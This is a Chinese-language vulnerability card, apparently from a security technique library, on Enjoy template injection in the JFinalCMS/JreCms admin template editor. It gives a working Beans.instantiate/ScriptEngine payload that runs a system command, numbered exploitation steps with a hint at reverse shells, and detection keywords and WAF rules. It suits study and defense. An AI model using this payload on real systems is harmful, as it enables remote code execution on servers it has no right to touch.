---
id: web-generic-ssti-jfinalcms-enjoy-beans-instantiate-scriptengine-rce
title: JFinalCMS 后台模板编辑 Enjoy SSTI：java.beans.Beans::instantiate 取 ScriptEngineManager 执行系统命令
type: scenario
domain: web
path: web/generic/ssti
technique: jfinalcms-enjoy-beans-instantiate-scriptengine-ssti-rce
aliases:
- Enjoy 模板注入
- JFinal 模板 SSTI
- java.beans.Beans::instantiate
- ScriptEngineManager getEngineByExtension js
- null
- jfinalcms 模板编辑 RCE
- JreCms 模板 RCE
tags:
- java
- jfinal
- enjoy
- ssti
- template-injection
- rce
- cms
- nashorn
- scriptengine
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V553
  verified_at: '2026-11-11T23:00:14+08:00'
  notes: '已对照原文与截图核对：图 05 后台模板编辑写入的 #set((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).getEngineByExtension("js").eval(...Runtime.exec("calc.exe"))) 与卡片 payload 逐字一致；图 06 首页弹出计算器；图 08 save() 用 FileUtils.write(webRoot+/templates/+filePath, content) 且内容无校验。dedup 候选 Beetl 静态调用、Spring Enjoy+SpEL 等为不同引擎/链，无同链。未验证点：未本机复现，JDK 版本（Nashorn 可用性）原文未注明。'
---

## 一句话结论

JFinalCMS/JreCms 后台"模板编辑"允许写入任意模板内容，而它使用的 Enjoy 模板引擎支持 `类::静态方法(...)` 静态调用：写入 `#set((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).getEngineByExtension("js").eval("...java.lang.Runtime...exec(\"calc.exe\")"))` 并保存，访问对应页面触发模板渲染即执行任意 Java 代码/系统命令。

## 原理

- **模板编辑等于代码执行**：`TemplateController.edit/save` 把 `content` 原样写入模板文件（`FileUtils.write(new File(webRoot+"/templates/"+filePath), content)`），没有任何内容校验；Enjoy 模板在下次渲染时解析执行，改动立即生效，无需重启。
- **Enjoy 的静态方法调用**：Enjoy 支持 `类名::静态方法(参数)` 的表达式语法（JFinal 系模板的常规能力），因此模板里可以直接触碰任意 Java 类；这不是"漏洞"，而是模板引擎的设计能力，危害来自"谁能写模板"。
- **为什么用 `java.beans.Beans::instantiate`**：`Beans.instantiate(ClassLoader, beanName)` 按类名反射实例化，模板里不用写 `new`，也不直接出现 `Runtime`/`ProcessBuilder` 之类常被关键字黑名单拦的类名；它返回 `javax.script.ScriptEngineManager`，再 `getEngineByExtension("js")` 拿到 JDK 内置 JS 引擎（Nashorn，JDK 8/11）。
- **JS 引擎是逃逸跳板**：`eval("function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"calc.exe\")")` 在 Nashorn 里可直接访问 Java 类，拿到 `Runtime` 实例并执行命令；整条链只用到 `java.beans.Beans`、`ScriptEngineManager`、`java.lang.Runtime` 三个词，分布在不同表达式层，静态关键字匹配很难覆盖。
- **执行时机**：模板保存后，访问渲染该模板的页面（本例首页/搜索页）即触发；原文明示"写入模板管理处，返回首页可以看到代码被执行"（弹出计算器）。

## 触发条件

- 应用使用 Enjoy 模板引擎（JFinal/JFinalCMS/JreCms 系），且未关闭静态方法表达式（部分版本有 `isStaticMethodExpressionEnabled` 检查；本例为开启状态）。
- 攻击者能写入/修改模板：后台模板管理（需管理员会话）、后台任意文件写、或模板路径穿越写等。
- 运行 JDK 含 JS 引擎（JDK 8/11 的 Nashorn 默认可用；JDK 15+ 已移除，此 payload 会因无 `js` 引擎失败，需换其它引擎/类链）。
- 模板所在页面可被访问触发渲染。

## 利用步骤

1. 登录后台（管理员），进入 系统管理 → 模板管理，选择要改的模板（如首页 `index.html`/`search.html`）。
2. 在模板内容最前面插入 payload（Enjoy `#set` 表达式）：
   ```
   #set((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).getEngineByExtension("js").eval("function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"calc.exe\")"))
   ```
3. 保存（`/admin/template/save`，参数 `directory=default&fileName=index.html&content=...`）；保存接口对内容无检测，直接落盘。
4. 访问渲染该模板的页面（首页/列表页），模板引擎解析 `#set` 时执行 JS，进而 `Runtime.exec` 拉起命令。
5. 把命令换成反弹 shell/下载器等即可进一步利用；也可写新模板文件并访问对应路由。

## PoC

原文实测 payload（写入模板后访问首页弹出计算器）：

```text
#set((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).getEngineByExtension("js").eval("function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"calc.exe\")"))
```

写入路径与请求（示意，需管理员会话）：

```text
GET /admin/template/edit?directory=default&fileName=index.html
POST /admin/template/save
directory=default&fileName=index.html&content=<上面的 payload + 原模板内容>
```

随后访问 `/`（或该模板对应页面）触发渲染。原文未给出完整 POST 报文，后台登录态与 CSRF 处理以实际版本为准。

## 变体与关联

- **引擎/语法变体**：同一 CMS 若使用 Beetl，可用 `${@类.静态方法}` 或反射绕过其 4 类黑名单（库内已有 Beetl 静态调用卡）；Freemarker/Velocity 各有对应 payload。Spring 集成 Enjoy 时还可从 `springMacroRequestContext` 取 Bean/ClassLoader（库内已有 Enjoy+Spring 内存马卡）。
- **写入点变体**：后台模板编辑、模板文件路径穿越写（`TemplateController.save` 的 `directory/fileName` 未过滤 `../`，见模板管理穿越卡）、任意文件上传覆盖模板，都可作为 payload 落地方式。
- **无 `js` 引擎的替代链**：JDK 15+ 可改用其它 `ScriptEngine`（若引入）、`Beans.instantiate` 实例化任意可执行类、或结合 `Class.forName`/反射链；具体取决于模板引擎允许的语法与类黑名单。
- **与文件读取联动**：先用 `/ajax/html` 或 `/common/down/file` 目录穿越读模板/配置，了解主题与目录结构后再写模板，成功率更高。

## 检测与防御

- **代码/配置**：模板引擎关闭静态方法表达式（如版本支持 `setStaticMethodExpressionEnabled(false)`），或对模板内容做白名单/关键模式校验（`::`、`Beans.instantiate`、`ScriptEngineManager`、`#set(`）；模板编辑仅限可信管理员，并加 CSRF 防护。
- **文件侧**：监控 `templates/` 目录的写入与内容变化，尤其包含 `#set(`、`::`、`Runtime`、`ScriptEngine` 等关键字的新增内容；模板修改后立即渲染的访问序列。
- **运行侧**：升级 JDK 到移除 Nashorn 的版本可抬高门槛（非根治）；限制 `ScriptEngine` 使用；对页面响应时间/子进程创建（`calc.exe`、`cmd.exe`）做告警。
- **WAF**：拦截请求体中的 `${`、`#set(`、`::`、`java.beans.Beans` 等模板注入特征（注意误报）。

## 备注

- 原文为审计记录：后台模板编辑写入 payload 后访问首页弹出计算器（截图），并注明修改内容"没有任何检测"。
- 截图界面为 JreCms（jfinalcms 衍生），模板语法为 Enjoy（`#set` + `::`），与库内 Beetl 卡属不同引擎/不同 payload，故独立成卡；未在本机复现。
